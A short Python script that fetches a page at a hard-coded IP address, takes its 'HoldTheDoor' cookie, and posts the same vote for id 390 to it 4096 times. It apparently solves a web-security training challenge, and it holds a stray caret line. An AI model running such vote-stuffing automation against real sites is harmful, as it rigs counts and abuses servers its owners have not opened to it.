import requests

                                                                            ^
l1url = 'http://158.69.76.135/level1.php'

r = requests.get(l1url)
for i in range(4096):
     requests.post(
     	l1url,
     	data = {
	     	'id':'390',
	     	'holdthedoor':'Submit',
	     	'key':r.cookies['HoldTheDoor']
     	},
     	cookies=r.cookies
 	)
